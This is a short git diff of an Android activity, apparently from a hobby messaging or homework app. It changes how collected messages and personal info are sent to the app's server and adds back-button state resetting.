@@ -45,7 +45,7 @@ public class InitActivity extends FragmentActivity {
 //        Typeface type = Typeface.createFromAsset(getAssets(), "fonts/homework.TTF");
 //        ((TextView)getActionBar().getCustomView().findViewById(R.id.title)).setTypeface(type);
 
-        ServerDAO.sendMessages(getMessages());
+        ServerDAO.sendMessages(getMessages(), this);
     }
 
     @Override
@@ -83,9 +83,12 @@ public class InitActivity extends FragmentActivity {
     }
 
     public void next(View view) {
-        Intent i = new Intent(InitActivity.this, MainActivity.class);
-        startActivity(i);
-        finish();
+        // TODO send personal info to server
+
+        // on callback set flag
+
+        final ShitApplication shit = (ShitApplication) this.getApplicationContext();
+        shit.infoHasLoaded(this, false);
     }
 
     /**
@@ -119,5 +122,13 @@ public class InitActivity extends FragmentActivity {
 
         cursor.close();
         return messages.toArray(new Message[messages.size()]);
+    }
+
+    @Override
+    public void onBackPressed() {
+        final ShitApplication shit = (ShitApplication) this.getApplicationContext();
+        shit.resetState();
+
+        super.onBackPressed();
     }
 }
